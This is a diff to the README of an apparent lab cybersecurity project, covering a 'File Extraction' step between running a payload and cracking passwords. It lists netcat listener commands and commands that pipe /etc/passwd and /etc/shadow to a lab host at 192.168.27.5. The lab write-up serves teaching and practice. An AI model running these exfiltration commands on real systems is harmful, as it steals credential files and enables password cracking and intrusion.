@@ -69,11 +69,16 @@ The goal of this project is to replicate real-world scenarios, execute attack si
 ![runPayload](https://github.com/mfaustino4786/Offensive-and-Defensive-Cybersecurity-Project/blob/main/screenshots/runpayload.png)
 
 --Step 3: File Extraction
+
 ###Commands###
+
 --nc -lvnp 9001 > passwd
 --nc -lvnp 9002 > shadow
+
 --cat /etc/passwd | nc 192.168.27.5 9001
+
 --cat /etc/shadow | nc 192.168.27.5 9002
+
 ![extract](https://github.com/mfaustino4786/Offensive-and-Defensive-Cybersecurity-Project/blob/main/screenshots/extractfiles.png)
 
 --Step 4: Password Cracking
